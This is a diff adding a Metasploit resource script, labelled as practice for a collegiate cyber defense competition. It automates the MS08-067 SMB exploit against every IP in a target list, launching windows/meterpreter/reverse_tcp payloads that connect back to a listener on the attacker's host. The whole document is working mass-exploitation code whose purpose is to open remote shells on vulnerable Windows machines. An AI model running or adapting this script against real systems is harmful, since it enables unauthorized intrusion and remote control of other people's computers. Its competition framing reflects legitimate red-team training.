@@ -1,0 +1,38 @@
+# Christopher Truncer CCDC Practice 1/25/2013
+# 08_067 autopwn
+# Modified similar script from from @mubix - awesome dude, very smart guy, check out his blog
+
+# Let's pick our payload
+
+use multi/handler
+setg PAYLOAD windows/meterpreter/reverse_tcp
+
+
+# Set the IP range and port globally
+
+setg LHOST 192.168.0.129
+setg LPORT 443
+set ExitOnSession false
+exploit -j -z
+
+
+# Now, let's pick our exploit
+
+use exploit/windows/smb/ms08_067_netapi
+set DisablePayloadHandler true
+
+
+# Let's setup our targets
+
+<ruby>
+require 'rex/socket/range_walker'
+rhosts = "/root/ccdc/iprange.txt"
+iplist = Rex::Socket::RangeWalker.new(rhosts)
+iplist.each do |rhost|
+
+self.run_single("set RHOST #{rhost}")
+self.run_single("exploit -j -z")
+
+end
+</ruby>
+
